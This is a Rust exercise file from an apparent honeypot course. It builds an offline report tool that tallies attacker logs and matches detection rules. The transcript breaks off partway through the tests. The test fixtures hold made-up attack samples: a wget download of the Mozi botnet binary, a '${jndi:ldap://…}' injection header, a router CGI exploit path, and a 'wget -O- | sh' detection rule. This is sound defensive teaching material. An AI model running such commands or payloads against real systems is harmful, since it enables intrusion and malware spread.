//! # Stage 9: A report tool for your own computer
//!
//! So far you've read the logs with `jq` and the notebook in `analysis/`. In this stage you write
//! a separate program, `report`, that reads the logs you've downloaded and prints a summary:
//! - the top usernames, passwords, commands, download addresses, web paths and services
//! - what changed from one day to the next
//! - a rules file you update by hand when a vulnerability is announced, with when each rule was
//!   first and last seen and how many addresses it came from
//!
//! It runs on your computer and is never uploaded to the server. It never connects to anything,
//! so there's no looking up addresses and no opening links, and a test fails if that ever changes.
//! It treats the logs as hostile: what it prints is plain text with everything escaped, and
//! passwords and addresses are hidden unless you ask. It can only look back as far as the logs
//! you've kept, which is `KEEP_DAYS`.
//!
//! This file does the work, on text it's handed, so it can't read files either. The program
//! itself is in `src/bin/report.rs`, and it's a worked example. Once you've finished the stage,
//! run it on your downloaded logs:
//!
//! ```text
//! cargo run --bin report -- ~/honeypot-logs --rules deploy/rules.txt
//! ```
//!
//! Do the exercises in order, replacing each `todo!()`. Run one exercise's tests with
//! `cargo test report::tests::ex1_`. Run all of Stage 9 with `cargo test report`.
//!
//! The tests named `guard_` already pass, and they should never stop passing.

// While the exercises are full of `todo!()`, some arguments, imports and other code aren't used,
// and the compiler warns about it. This line silences those warnings.
// Delete this comment and the line below once you've finished the stage.
#![allow(dead_code, unused_variables, unused_imports)]

use std::collections::{BTreeMap, HashMap, HashSet};
use std::io;
use std::net::IpAddr;
use std::path::PathBuf;

use chrono::NaiveDate;
use serde::Deserialize;

use crate::fake_web::BASE64_ALPHABET;
use crate::log_files::{date_from_seconds, mask_ip};
use crate::login::escape_for_log;

/// How many of each list the report shows, unless you say otherwise with `--top`.
pub const DEFAULT_TOP: usize = 10;

/// The longest a value can be on screen. Commands can be 2 KB, and a report you can't read is no
/// use. The logs always have all of it.
pub const MAX_SHOWN_CHARS: usize = 100;

fn report_error(message: String) -> io::Error {
    io::Error::new(io::ErrorKind::InvalidInput, message)
}

// ---------------------------------------------------------------------------
// Reading a log line back
// ---------------------------------------------------------------------------

/// One line of the log, read back.
///
/// The honeypot writes `Visit` with `Serialize`, and this reads it with `Deserialize`, which is
/// the same idea the other way round. It's a separate struct because the report only needs some
/// of the fields, and because it has to cope with lines from before a field existed.
///
/// `#[serde(default)]` is what makes that work. A field that's missing from the JSON gets its
/// default instead of being an error, so a line from Stage 2, with no `shell`, `service` or
/// `http`, still reads. Fields in the JSON that aren't here, like `telnet`, are skipped.
#[derive(Debug, Clone, Default, PartialEq, Deserialize)]
#[serde(default)]
pub struct LoggedVisit {
    pub time: u64,
    pub source_ip: String,
    pub outcome: String,
    pub username: Option<String>,
    pub password: Option<String>,
    pub service: Option<String>,
    pub shell: Option<LoggedShell>,
    pub http: Option<LoggedHttp>,
}

/// The `shell` part of a log line, from Stage 7.
#[derive(Debug, Clone, Default, PartialEq, Deserialize)]
#[serde(default)]
pub struct LoggedShell {
    pub commands: Vec<String>,
    pub urls: Vec<String>,
}

/// The `http` part of a log line, from Stage 8. `body` is still base64 here.
#[derive(Debug, Clone, Default, PartialEq, Deserialize)]
#[serde(default)]
pub struct LoggedHttp {
    pub method: String,
    pub target: String,
    pub headers: Vec<(String, String)>,
    pub body: String,
}

/// EXERCISE 1: read one line of the log back into a `LoggedVisit`.
///
/// Return `None` for a line that isn't a visit, so one damaged line can't stop the report. That
/// includes a blank line, a line that isn't JSON, and JSON that isn't an object with a `time`.
///
/// The new idea is the other half of `serde`: `serde_json::from_str::<LoggedVisit>(line)` is
/// `JSON.parse` in JS or `json.loads` in Python, except it checks the shape against the struct and
/// gives you a `Result`.
///
/// Hints:
/// - `.ok()` turns the `Result` into an `Option`.
/// - Every line the honeypot writes has a `time`. `#[serde(default)]` would quietly give `{}` a
///   time of 0, so check the line has one: `line.contains("\"time\"")` is enough here.
pub fn parse_line(line: &str) -> Option<LoggedVisit> {
    todo!()
}

/// EXERCISE 2: turn base64 back into bytes.
///
/// This undoes Exercise 5 of Stage 8. Every 4 characters become 3 bytes, and each `=` at the end
/// means one byte fewer. Return `None` if the text isn't base64: a length that isn't a multiple of
/// 4, a character that isn't in `BASE64_ALPHABET`, or `=` anywhere but the last one or two places.
///
/// The new idea is going from a character back to its number. `BASE64_ALPHABET.iter().position(...)`
/// finds where a byte is in the list, and gives `None` if it isn't there, so `?` can leave early.
///
/// Hints:
/// - `text.as_bytes().chunks(4)` gives you the groups.
/// - Count the `=` at the end of the last group, and treat each one as 0 while you build the
///   number. Then push only `3 - padding` of the bytes.
/// - The bytes come out as `(group >> 16) as u8`, `(group >> 8) as u8` and `group as u8`. `as u8`
///   keeps only the lowest 8 bits, which is what you want here.
pub fn decode_base64(text: &str) -> Option<Vec<u8>> {
    todo!()
}

// ---------------------------------------------------------------------------
// Counting
// ---------------------------------------------------------------------------

/// How many times each value was seen.
#[derive(Debug, Default)]
pub struct Tally {
    counts: HashMap<String, usize>,
}

impl Tally {
    pub fn new() -> Tally {
        Tally::default()
    }

    /// How many different values there are.
    pub fn distinct(&self) -> usize {
        self.counts.len()
    }

    /// EXERCISE 3: count one more of this value.
    ///
    /// The new idea is the `entry` API, which looks a key up once and lets you change what's there,
    /// whether or not it was there before. It's `counts[key] = counts.get(key, 0) + 1` in Python:
    ///
    /// ```text
    /// *self.counts.entry(key.to_string()).or_insert(0) += 1;
    /// ```
    ///
    /// `or_insert(0)` puts a 0 there if the key is new, and gives you a `&mut usize` either way.
    /// The `*` in front changes the number it points to.
    pub fn add(&mut self, value: &str) {
        todo!()
    }

    /// EXERCISE 4: the most common values, most first.
    ///
    /// Return at most `limit` pairs of value and count. Sort by count, highest first, and sort
    /// values with the same count alphabetically, so the report comes out the same every time. A
    /// `HashMap` has no order of its own, so without that last rule two runs could differ.
    ///
    /// The new idea is sorting with your own rule:
    ///
    /// ```text
    /// pairs.sort_by(|a, b| b.1.cmp(&a.1).then_with(|| a.0.cmp(b.0)));
    /// ```
    ///
    /// `cmp` compares two values and gives `Less`, `Equal` or `Greater`. Putting `b` first sorts
    /// highest first, and `then_with` only decides when the counts are equal.
    ///
    /// Hints:
    /// - `self.counts.iter()` gives `(&String, &usize)`. Map each to `(value.as_str(), *count)`
    ///   and collect them into a `Vec`.
    /// - `.truncate(limit)` keeps only the first `limit`.
    pub fn top(&self, limit: usize) -> Vec<(&str, usize)> {
        todo!()
    }
}

// ---------------------------------------------------------------------------
// Rules for new vulnerabilities
// ---------------------------------------------------------------------------

/// Where in a visit a rule looks.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Field {
    /// A web request's path, with its query string.
    Path,
    /// Each web header, as `Name: value`.
    Header,
    /// A web request's body, decoded from base64.
    Body,
    /// Each command typed in the fake shell.
    Command,
    /// Each download address from the fake shell.
    Url,
    /// All of the above.
    Any,
}

impl Field {
    /// The word for this field in a rules file. A `match` that returns text is a common way to
    /// give an enum names.
    pub fn name(self) -> &'static str {
        match self {
            Field::Path => "path",
            Field::Header => "header",
            Field::Body => "body",
            Field::Command => "command",
            Field::Url => "url",
            Field::Any => "any",
        }
    }

    /// The field with this name, if there is one.
    pub fn from_name(name: &str) -> Option<Field> {
        [
            Field::Path,
            Field::Header,
            Field::Body,
            Field::Command,
            Field::Url,
            Field::Any,
        ]
        .into_iter()
        .find(|field| field.name() == name)
    }

    /// EXERCISE 6: gather the text a rule with this field looks in.
    ///
    /// | Field     | The text                                                         |
    /// | --------- | ---------------------------------------------------------------- |
    /// | `Path`    | the web request's `target`                                       |
    /// | `Header`  | each header, as `Name: value`                                    |
    /// | `Body`    | the body, decoded and turned into text with `from_utf8_lossy`    |
    /// | `Command` | each command from the shell                                      |
    /// | `Url`     | each download address from the shell                             |
    /// | `Any`     | all of these together                                            |
    ///
    /// A visit with no `http` or no `shell` has nothing for those fields, so give back an empty
    /// list. If a body isn't valid base64, use the text as it is, so a damaged line can still match.
    ///
    /// The new idea is matching on an enum to decide what to do, and getting at data inside an
    /// `Option` without unwrapping it:
    ///
    /// ```text
    /// match self {
    ///     Field::Path => visit.http.iter().map(|http| http.target.clone()).collect(),
    ///     ...
    /// }
    /// ```
    ///
    /// `.iter()` on an `Option` gives zero or one items, so the same code works whether or not
    /// there's a request.
    ///
    /// Hints:
    /// - `flat_map` turns each item into several and joins them, which suits headers and commands.
    /// - For `Any`, call `texts_in` again with each of the other five, and join the results.
    pub fn texts_in(self, visit: &LoggedVisit) -> Vec<String> {
        todo!()
    }
}

/// One line of a rules file: a name, where to look, and the text to look for.
#[derive(Debug, Clone, PartialEq)]
pub struct Rule {
    pub name: String,
    pub field: Field,
    pub text: String,
}

impl Rule {
    /// EXERCISE 5: read a rules file.
    ///
    /// Each line is a rule's name, where to look and what to look for, with `|` between them.
    /// Blank lines and lines starting with `#` are skipped, as in Stage 7's list of logins:
    ///
    /// ```text
    /// # Added 2026-11-20, from the advisory for the camera firmware bug.
    /// jndi lookup     | any    | ${jndi:
    /// router cgi      | path   | /cgi-bin/luci/;stok=
    /// mozi botnet     | command | Mozi.m
    /// ```
    ///
    /// Trim the spaces around each part. The text to look for is everything after the second `|`,
    /// so it can hold a `|` of its own. A line with fewer than three parts, an empty name or text,
    /// or a field that `Field::from_name` doesn't know is an error, with the line's number in the
    /// message, like `line 3`. A file with no rules is fine: the report just has no rules section.
    ///
    /// The new idea is `splitn(3, '|')`, which stops after the third part, so the last part keeps
    /// every `|` after it. Then a slice pattern takes it apart, as in Stage 8:
    ///
    /// ```text
    /// let parts: Vec<&str> = line.splitn(3, '|').map(str::trim).collect();
    /// let [name, field, text] = parts.as_slice() else { return Err(...) };
    /// ```
    pub fn parse_rules(text: &str) -> io::Result<Vec<Rule>> {
        todo!()
    }

    /// EXERCISE 7: decide whether this rule matches a visit.
    ///
    /// It matches if any of the rule's texts holds the rule's text, ignoring case. Exploits are
    /// often sent in odd mixes of upper and lower case to get past filters, so `${JNDI:` should
    /// match a rule for `${jndi:`.
    ///
    /// The values in a log line were escaped before they were stored, so a rule looks for the
    /// escaped form. That's what you see in the log, so it's what you'll copy into a rule.
    ///
    /// Hints:
    /// - `.to_lowercase()` on both sides, then `.contains(...)`.
    /// - `.iter().any(...)` from Stage 5 checks whether any text matches.
    pub fn matches(&self, visit: &LoggedVisit) -> bool {
        todo!()
    }
}

/// What one rule has matched so far.
#[derive(Debug, Clone, Default, PartialEq)]
pub struct RuleHits {
    pub visits: usize,
    pub first_seen: Option<u64>,
    pub last_seen: Option<u64>,
    pub addresses: HashSet<String>,
}

impl RuleHits {
    /// EXERCISE 8: add one matching visit.
    ///
    /// Count the visit, keep the earliest and latest `time` seen, and remember the address. Log
    /// files can be read in any order, so don't assume this visit is later than the ones before.
    ///
    /// The new idea is `HashSet`, which is a `HashMap` with only keys, like `Set` in JS or `set` in
    /// Python. Adding an address that's already there changes nothing, so `.len()` is the number of
    /// different addresses.
    ///
    /// Hints:
    /// - `Option<u64>` can be compared and combined with `map_or`. For the earliest:
    ///   `Some(self.first_seen.map_or(visit.time, |seen| seen.min(visit.time)))`.
    /// - `self.addresses.insert(visit.source_ip.clone())`.
    pub fn record(&mut self, visit: &LoggedVisit) {
        todo!()
    }
}

// ---------------------------------------------------------------------------
// The whole report
// ---------------------------------------------------------------------------

/// The totals for one day.
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq)]
pub struct DayTotals {
    /// Every visit.
    pub visits: u64,
    /// Visits that got into the fake shell.
    pub logins: u64,
    /// Commands typed in the fake shell.
    pub commands: u64,
    /// Visits to the fake web service that sent a request.
    pub requests: u64,
}

/// Everything the report has counted.
///
/// `BTreeMap` is a `HashMap` that keeps its keys in order. Dates come out oldest first, which is
/// what a report going day by day needs.
#[derive(Debug, Default)]
pub struct Report {
    pub days: BTreeMap<NaiveDate, DayTotals>,
    pub usernames: Tally,
    pub passwords: Tally,
    pub commands: Tally,
    pub urls: Tally,
    pub paths: Tally,
    pub services: Tally,
    pub addresses: Tally,
    pub rules: Vec<(Rule, RuleHits)>,
    pub visits: u64,
    pub unreadable_lines: u64,
}

impl Report {
    pub fn new(rules: Vec<Rule>) -> Report {
        Report {
            rules: rules
                .into_iter()
                .map(|rule| (rule, RuleHits::default()))
                .collect(),
            ..Report::default()
        }
    }

    // This is a worked example. A line that isn't a visit is counted, so the report can say how
    // many there were, and otherwise skipped.
    pub fn add_line(&mut self, line: &str) {
        if line.trim().is_empty() {
            return;
        }
        match parse_line(line) {
            Some(visit) => self.add(&visit),
            None => self.unreadable_lines += 1,
        }
    }

    /// EXERCISE 9: count one visit in every part of the report.
    ///
    /// Do these in order:
    /// 1. Add 1 to `self.visits`.
    /// 2. Find the day's totals with `date_from_seconds(visit.time)` and
    ///    `self.days.entry(date).or_default()`, and count the visit there. It's a login if its
    ///    `outcome` is `"logged_in"`, and a request if it's `"requested"` and has an `http` part.
    ///    Count its commands too.
    /// 3. Add its address to `self.addresses`, and its service to `self.services`. A visit with no
    ///    `service` came to the telnet login, so count it as `"telnet"`.
    /// 4. Add its username and password, if it has them, its commands and its download addresses.
    /// 5. Add the web path if it has one. Leave off the query string, as on screen in Stage 8, so
    ///    `/login?user=a` and `/login?user=b` count as one path.
    /// 6. For each rule, if it `matches`, `record` the visit in its hits.
    ///
    /// The new idea is borrowing two parts of `self` at once. `for (rule, hits) in &mut self.rules`
    /// gives you a `&Rule` and a `&mut RuleHits` from the same list, which Rust allows because each
    /// pair is separate.
    ///
    /// Hint: `if let Some(name) = &visit.username { ... }` and `.as_deref().unwrap_or(...)` both
    /// help with the `Option`s.
    pub fn add(&mut self, visit: &LoggedVisit) {
        todo!()
    }
}

/// EXERCISE 10: describe how a number changed since the day before.
///
/// ```text
/// change(713, Some(520))  →  "+193"
/// change(500, Some(520))  →  "-20"
/// change(520, Some(520))  →  "same"
/// change(713, None)       →  "first day"
/// ```
///
/// The new idea is subtracting numbers that can't go below zero. `u64` has no negative numbers, so
/// `500 - 520` would crash in a debug build. Compare them first, then subtract the smaller from the
/// larger. `std::cmp::Ordering` names the three answers that `cmp` gives:
///
/// ```text
/// match today.cmp(&before) {
///     Ordering::Greater => ...,
///     Ordering::Less => ...,
///     Ordering::Equal => ...,
/// }
/// ```
pub fn change(today: u64, before: Option<u64>) -> String {
    todo!()
}

/// What the report was asked to do.
#[derive(Debug, Clone, PartialEq)]
pub struct ReportOptions {
    pub folder: PathBuf,
    pub rules: Option<PathBuf>,
    pub top: usize,
    pub show_secrets: bool,
}

impl ReportOptions {
    /// EXERCISE 11: read the report's command line.
    ///
    /// ```text
    /// ~/honeypot-logs --rules deploy/rules.txt --top 20 --show-secrets
    /// ```
    ///
    /// - The folder of logs comes first, and it has to be there.
    /// - `--rules FILE` names a rules file. Without it there are no rules.
    /// - `--top N` says how many of each list to show. It's `DEFAULT_TOP` otherwise, and it has to
    ///   be a whole number above 0.
    /// - `--show-secrets` shows passwords and full addresses. Without it, they're hidden.
    /// - Anything else is an error, including a second folder. A typo must never be quietly
    ///   ignored, as in Stage 5.
    ///
    /// This is `Settings::from_args` again, so look there if you get stuck. The new part is a
    /// value with no flag in front of it. Anything that doesn't start with `--` is the folder, if
    /// there isn't one yet.
    pub fn from_args(args: &[String]) -> io::Result<ReportOptions> {
        todo!()
    }
}

// ---------------------------------------------------------------------------
// Printing it
// ---------------------------------------------------------------------------

// Everything below is a worked example. It turns what you've counted into text, and it's the last
// line of defence, so it assumes every value is hostile.

// A value made safe to print. The honeypot escaped it before storing it, but these are logs you
// downloaded, and anything could have edited them since. So any character that could change what
// your terminal does is escaped again, and anything very long is cut short.
pub fn printable(text: &str) -> String {
    let safe = if text.chars().any(char::is_control) {
        escape_for_log(text)
    } else {
        text.to_string()
    };
    if safe.chars().count() > MAX_SHOWN_CHARS {
        let start: String = safe.chars().take(MAX_SHOWN_CHARS).collect();
        format!("{start}...")
    } else {
        safe
    }
}

// An address you can read but can't click. Terminals and editors turn `http://` into a link, and
// safety rule 4 says never to open one from the logs, even by accident. The same trick is used in
// `analysis/` and in the published report.
pub fn defanged(text: &str) -> String {
    text.replace("http", "hxxp")
        .replace("ftp", "fxp")
        .replace('.', "[.]")
}

// An address from the log, masked as on the honeypot's own screen unless secrets are shown.
fn shown_address(text: &str, show_secrets: bool) -> String {
    if show_secrets {
        return printable(text);
    }
    match text.parse::<IpAddr>() {
        Ok(ip) => mask_ip(ip),
        Err(_) => "(not an address)".to_string(),
    }
}

fn date_of(seconds: Option<u64>) -> String {
    seconds.map_or("-".to_string(), |seconds| {
        date_from_seconds(seconds).to_string()
    })
}

fn section(
    out: &mut String,
    title: &str,
    tally: &Tally,
    top: usize,
    show: impl Fn(&str) -> String,
) {
    out.push_str(&format!("\n{title} ({} different)\n", tally.distinct()));
    let rows = tally.top(top);
    if rows.is_empty() {
        out.push_str("  (none)\n");
    }
    for (value, count) in rows {
        out.push_str(&format!("  {count:>7}  {}\n", show(value)));
    }
}

impl Report {
    /// The whole report, as plain text.
    pub fn render(&self, top: usize, show_secrets: bool) -> String {
        let mut out = String::new();
        let first = self.days.keys().next();
        let last = self.days.keys().next_back();
        match (first, last) {
            (Some(first), Some(last)) => out.push_str(&format!(
                "{} visits from {} addresses, {first} to {last}.\n",
                self.visits,
                self.addresses.distinct()
            )),
            _ => out.push_str("No visits.\n"),
        }
        if self.unreadable_lines > 0 {
            out.push_str(&format!(
                "{} lines couldn't be read and were skipped.\n",
                self.unreadable_lines
            ));
        }
        if !show_secrets {
            out.push_str("Passwords and addresses are hidden. Add --show-secrets to see them.\n");
        }

        out.push_str("\nBy day\n");
        let mut before: Option<DayTotals> = None;
        for (date, day) in &self.days {
            out.push_str(&format!(
                "  {date}  visits {:>6} ({})  logins {:>5} ({})  commands {:>6}  web {:>5} ({})\n",
                day.visits,
                change(day.visits, before.map(|b| b.visits)),
                day.logins,
                change(day.logins, before.map(|b| b.logins)),
                day.commands,
                day.requests,
                change(day.requests, before.map(|b| b.requests)),
            ));
            before = Some(*day);
        }

        section(&mut out, "Services", &self.services, top, printable);
        section(&mut out, "Usernames", &self.usernames, top, printable);
        if show_secrets {
            section(&mut out, "Passwords", &self.passwords, top, printable);
        } else {
            out.push_str(&format!(
                "\nPasswords ({} different)\n  (hidden)\n",
                self.passwords.distinct()
            ));
        }
        section(&mut out, "Commands", &self.commands, top, printable);
        section(
            &mut out,
            "Download addresses, defanged. Never open these",
            &self.urls,
            top,
            |url| printable(&defanged(url)),
        );
        section(&mut out, "Web paths", &self.paths, top, printable);
        section(&mut out, "Addresses", &self.addresses, top, |ip| {
            shown_address(ip, show_secrets)
        });

        if !self.rules.is_empty() {
            out.push_str("\nRules\n");
            for (rule, hits) in &self.rules {
                out.push_str(&format!(
                    "  {}  [{}]  visits {}  addresses {}  first {}  last {}\n",
                    printable(&rule.name),
                    rule.field.name(),
                    hits.visits,
                    hits.addresses.len(),
                    date_of(hits.first_seen),
                    date_of(hits.last_seen),
                ));
            }
        }
        out
    }
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------
//
// You don't need to change anything below, but do read the tests: they show exactly how your code
// is going to be used. Every log line here is made up.

#[cfg(test)]
mod tests {
    use super::*;
    use crate::deploy::{code_only, forbidden_uses, violations_in_folder};
    use crate::fake_web::encode_base64;
    use std::fs;
    use std::path::Path;

    // One of each kind of line the honeypot writes, with documentation addresses.
    const LOGIN_LINE: &str = r#"{"time":1793664000,"source_ip":"203.0.113.1","outcome":"attempted","username":"admin","password":"hunter2"}"#;
    const SHELL_LINE: &str = r#"{"time":1793667600,"source_ip":"203.0.113.2","outcome":"logged_in","username":"root","password":"root","telnet":"fffc01","shell":{"ended":"exit","commands":["cd /tmp","wget http://198.51.100.9/Mozi.m","exit"],"urls":["http://198.51.100.9/Mozi.m"],"reply_bytes":66}}"#;
    const WEB_LINE: &str = r#"{"time":1793754000,"source_ip":"203.0.113.3","outcome":"requested","username":null,"password":null,"service":"http","http":{"method":"GET","target":"/cgi-bin/luci/;stok=/locale?x=1","version":"HTTP/1.1","headers":[["User-Agent","${jndi:ldap://198.51.100.9/a}"]],"body":"","received_bytes":90,"truncated":false}}"#;
    const LEFT_LINE: &str = r#"{"time":1793754100,"source_ip":"203.0.113.3","outcome":"left","username":null,"password":null}"#;

    fn visit(line: &str) -> LoggedVisit {
        parse_line(line).unwrap()
    }

    fn web_visit_with_body(body: &[u8]) -> LoggedVisit {
        LoggedVisit {
            time: 1,
            source_ip: "203.0.113.4".to_string(),
            outcome: "requested".to_string(),
            http: Some(LoggedHttp {
                method: "POST".to_string(),
                target: "/x".to_string(),
                headers: Vec::new(),
                body: encode_base64(body),
            }),
            ..LoggedVisit::default()
        }
    }

    fn rule(field: Field, text: &str) -> Rule {
        Rule {
            name: "test".to_string(),
            field,
            text: text.to_string(),
        }
    }

    fn args(text: &str) -> Vec<String> {
        text.split_whitespace().map(String::from).collect()
    }

    fn sample_report(rules: Vec<Rule>) -> Report {
        let mut report = Report::new(rules);
        for line in [LOGIN_LINE, SHELL_LINE, WEB_LINE, LEFT_LINE, "not json", ""] {
            report.add_line(line);
        }
        report
    }

    // -----------------------------------------------------------------------
    // Guards: these already pass, and they should never stop passing.
    // -----------------------------------------------------------------------

    // The report works on text it's handed. Reading the folder is the program's job, in
    // `src/bin/report.rs`, so this file can't touch the system at all.
    #[test]
    fn guard_this_file_cannot_touch_the_system() {
        let source = fs::read_to_string("src/report.rs").unwrap();
        let never_here = [
            "std::fs",
            "fs::",
            "std::process",
            "process::",
            "Command::",
            "std::env",
            "std::os",
            "std::thread",
            "TcpStream",
            "TcpListener",
            "UdpSocket",
            "ToSocketAddrs",
            "File::",
            "OpenOptions",
        ];
        let found = forbidden_uses(code_only(&source), &never_here);
        assert!(found.is_empty(), "these lines break the rules: {found:#?}");
    }

    // The program reads files, and that's all. Stage 5's check skips folders inside `src`, so this
    // runs the same rules on `src/bin`, with listening added, since the report never needs to.
    #[test]
    fn guard_the_report_program_never_connects_or_runs_anything() {
        let forbidden = [
            "std::process",
            "process::Command",
            "std::net",
            "TcpStream",
            "TcpListener",
            "UdpSocket",
            ".connect(",
            "ToSocketAddrs",
            "to_socket_addrs",
            "extern \"C\"",
            "reqwest::",
            "ureq::",
            "hyper::",
            "curl::",
        ];
        let found = violations_in_folder(Path::new("src/bin"), &forbidden).unwrap();
        assert!(found.is_empty(), "these lines break the rules: {found:#?}");
        let source = fs::read_to_string("src/bin/report.rs").unwrap();
        assert!(source.contains("#![forbid(unsafe_code)]"));
        assert!(source.contains("check_private"));
    }

    #[test]
    fn guard_printing_escapes_anything_that_could_reach_the_terminal() {
        assert_eq!(printable("ls\u{1b}[2J\u{7}"), "ls\\u{1b}[2J\\u{7}");
        assert_eq!(printable("a\nb\rc"), "a\\nb\\rc");
        assert_eq!(printable("plain text"), "plain text");
        let long = "a".repeat(MAX_SHOWN_CHARS + 5);
        assert_eq!(
            printable(&long),
            format!("{}...", "a".repeat(MAX_SHOWN_CHARS))
        );
    }

    #[test]
    fn guard_addresses_are_never_printed_as_links() {
        let shown = defanged("http://198.51.100.9/a.sh https://x.example ftp://y.example");
        assert!(!shown.contains("http"), "{shown}");
        assert!(!shown.contains("ftp"), "{shown}");
        assert!(!shown.contains("198.51"), "{shown}");
    }

    // -----------------------------------------------------------------------
    // The exercises
    // -----------------------------------------------------------------------

    #[test]
    fn ex1_reads_a_login() {
        let read = visit(LOGIN_LINE);
        assert_eq!(read.time, 1793664000);
        assert_eq!(read.source_ip, "203.0.113.1");
        assert_eq!(read.outcome, "attempted");
        assert_eq!(read.username.as_deref(), Some("admin"));
        assert_eq!(read.password.as_deref(), Some("hunter2"));
        assert_eq!(read.service, None);
        assert_eq!(read.shell, None);
    }

    #[test]
    fn ex1_reads_a_session() {
        let shell = visit(SHELL_LINE).shell.unwrap();
        assert_eq!(shell.commands.len(), 3);
        assert_eq!(shell.urls, ["http://198.51.100.9/Mozi.m"]);
    }

    #[test]
    fn ex1_reads_a_web_request() {
        let read = visit(WEB_LINE);
        assert_eq!(read.service.as_deref(), Some("http"));
        let http = read.http.unwrap();
        assert_eq!(http.method, "GET");
        assert_eq!(http.headers.len(), 1);
    }

    #[test]
    fn ex1_a_line_with_missing_fields_still_reads() {
        let read = visit(r#"{"time":5,"source_ip":"203.0.113.9"}"#);
        assert_eq!(read.time, 5);
        assert_eq!(read.outcome, "");
    }

    #[test]
    fn ex1_anything_else_is_none() {
        for line in [
            "",
            "not json",
            "[1,2,3]",
            "{}",
            r#"{"time":"soon"}"#,
            "{\"time\":1",
        ] {
            assert_eq!(parse_line(line), None, "{line}");
        }
    }

    #[test]
    fn ex2_decodes() {
        assert_eq!(decode_base64("aGkh"), Some(b"hi!".to_vec()));
        assert_eq!(
            decode_base64("aGVsbG8gd29ybGQh"),
            Some(b"hello world!".to_vec())
        );
    }

    #[test]
    fn ex2_handles_padding() {
        assert_eq!(decode_base64("aGk="), Some(b"hi".to_vec()));
        assert_eq!(decode_base64("aA=="), Some(b"h".to_vec()));
        assert_eq!(decode_base64(""), Some(Vec::new()));
    }

    #[test]
    fn ex2_undoes_stage_8_for_every_byte() {
        let every_byte: Vec<u8> = (0..=255).collect();
        for length in 0..every_byte.len() {
            let bytes = &every_byte[..length];
            assert_eq!(decode_base64(&encode_base64(bytes)).as_deref(), Some(bytes));
        }
    }

    #[test]
    fn ex2_anything_else_is_none() {
        for text in [
            "a", "aGk", "aGk!", "a===", "aG=k", "aA==aGkh", "aGk=\n", "aGkhé",
        ] {
            assert_eq!(decode_base64(text), None, "{text:?}");
        }
    }

    #[test]
    fn ex3_counts() {
        let mut tally = Tally::new();
        tally.add("root");
        tally.add("admin");
        tally.add("root");
        assert_eq!(tally.counts.get("root"), Some(&2));
        assert_eq!(tally.counts.get("admin"), Some(&1));
        assert_eq!(tally.distinct(), 2);
    }

    #[test]
    fn ex4_most_common_first() {
        let mut tally = Tally::new();
        for value in ["a", "b", "b", "c", "c", "c"] {
            tally.add(value);
        }
        assert_eq!(tally.top(10), [("c", 3), ("b", 2), ("a", 1)]);
    }

    #[test]
    fn ex4_ties_go_alphabetically() {
        let mut tally = Tally::new();
        for value in ["pear", "apple", "fig", "apple", "pear", "fig"] {
            tally.add(value);
        }
        assert_eq!(tally.top(10), [("apple", 2), ("fig", 2), ("pear", 2)]);
    }

    #[test]
    fn ex4_keeps_at_most_the_limit() {
        let mut tally = Tally::new();
        for value in ["a", "b", "c", "d"] {
            tally.add(value);
        }
        assert_eq!(tally.top(2), [("a", 1), ("b", 1)]);
        assert!(tally.top(0).is_empty());
        assert!(Tally::new().top(5).is_empty());
    }

    #[test]
    fn ex5_reads_rules() {
        let rules =
            Rule::parse_rules("# comment\n\njndi | any | ${jndi:\nrouter|path|/cgi-bin/luci\n")
                .unwrap();
        assert_eq!(
            rules,
            [
                Rule {
                    name: "jndi".to_string(),
                    field: Field::Any,
                    text: "${jndi:".to_string()
                },
                Rule {
                    name: "router".to_string(),
                    field: Field::Path,
                    text: "/cgi-bin/luci".to_string()
                },
            ]
        );
    }

    #[test]
    fn ex5_the_text_can_hold_a_bar() {
        let rules = Rule::parse_rules("pipe to shell | command | wget -O- | sh").unwrap();
        assert_eq!(rules[0].text, "wget -O- | sh");
    }

    #[test]
    fn ex5_errors_name_the_line() {
        for bad in ["a | path", "| path | x", "a | path | ", "a | nowhere | x"] {
            let text = format!("# first\nok | url | x\n{bad}\n");
            let error = Rule::parse_rules(&text).unwrap_err();
            assert_eq!(error.kind(), io::ErrorKind::InvalidInput, "{bad}");
            assert!(error.to_string().contains("line 3"), "{bad}: {error}");
        }
    }

    #[test]
    fn ex5_no_rules_is_fine() {
        assert_eq!(Rule::parse_rules("# nothing yet\n").unwrap(), []);
        assert_eq!(Rule::parse_rules("").unwrap(), []);
    }

    #[test]
    fn ex5_the_example_rules_in_the_repo_are_valid() {
        let text = fs::read_to_string("deploy/rules.txt").unwrap();
        assert!(!Rule::parse_rules(&text).unwrap().is_empty());
    }

    #[test]
    fn ex6_path() {
        assert_eq!(
            Field::Path.texts_in(&visit(WEB_LINE)),
            ["/cgi-bin/luci/;stok=/locale?x=1"]
        );
    }

    #[test]
    fn ex6_headers() {
        assert_eq!(
            Field::Header.texts_in(&visit(WEB_LINE)),
            ["User-Agent: ${jndi:ldap://198.51.100.9/a}"]
        );
    }

    #[test]
    fn ex6_body_is_decoded() {
        let decoded = Field::Body.texts_in(&web_visit_with_body(b"cmd=id&x=\xff"));
        assert_eq!(decoded, ["cmd=id&x=\u{fffd}"]);
    }

    #[test]
    fn ex6_a_body_that_is_not_base64_is_used_as_it_is() {
        let mut visit = web_visit_with_body(b"");
        visit.http.as_mut().unwrap().body = "not base64!".to_string();
        assert_eq!(Field::Body.texts_in(&visit), ["not base64!"]);
    }

    #[test]
    fn ex6_commands_and_urls() {
        let session = visit(SHELL_LINE);
        assert_eq!(Field::Command.texts_in(&session).len(), 3);
        assert_eq!(
            Field::Url.texts_in(&session),
            ["http://198.51.100.9/Mozi.m"]
        );
    }

    #[test]
    fn ex6_any_gathers_everything() {
        assert_eq!(Field::Any.texts_in(&visit(SHELL_LINE)).len(), 4);
        assert_eq!(Field::Any.texts_in(&visit(WEB_LINE)).len(), 3);
    }

    #[test]
    fn ex6_nothing_there_is_an_empty_list() {
        let login = visit(LOGIN_LINE);
        for field in [
            Field::Path,
            Field::Header,
            Field::Body,
            Field::Command,
            Field::Url,
            Field::Any,
        ] {
            assert!(field.texts_in(&login).is_empty(), "{field:?}");
        }
    }

    #[test]
    fn ex7_matches_text_in_its_field() {
        assert!(rule(Field::Path, "/cgi-bin/luci").matches(&visit(WEB_LINE)));
        assert!(rule(Field::Command, "Mozi.m").matches(&visit(SHELL_LINE)));
        assert!(rule(Field::Body, "cmd=id").matches(&web_visit_with_body(b"x=1&cmd=id")));
    }

    #[test]
    fn ex7_ignores_case() {
